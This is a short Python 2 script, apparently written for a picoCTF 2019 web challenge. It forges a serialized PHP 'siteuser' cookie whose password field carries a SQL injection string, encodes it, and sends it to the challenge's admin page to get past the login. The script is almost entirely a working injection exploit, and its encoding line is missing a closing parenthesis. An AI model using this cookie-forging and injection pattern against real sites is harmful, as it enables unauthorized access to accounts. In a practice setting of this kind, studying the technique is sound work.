#! /usr/bin python2
# just for demo , not the answer !

import requests
from string import printable
from urllib import quote_plus
from base64 import b64encode, b64decode

cookie = 'O:8:"siteuser":2:{s:8:"username";s:5:"admin";s:8:"password";s:22:"1\' or password like \'%";}'
url = 'https://2019shell1.picoctf.com/problem/62195/index.php?file=admin'

cookie = cookie
cookie_encode = quote_plus(b64encode(cookie) # quote_plus => = -> %3d , etc
req = requests.get(url, cookies={"user_info":cookie_encode})
print(req.text)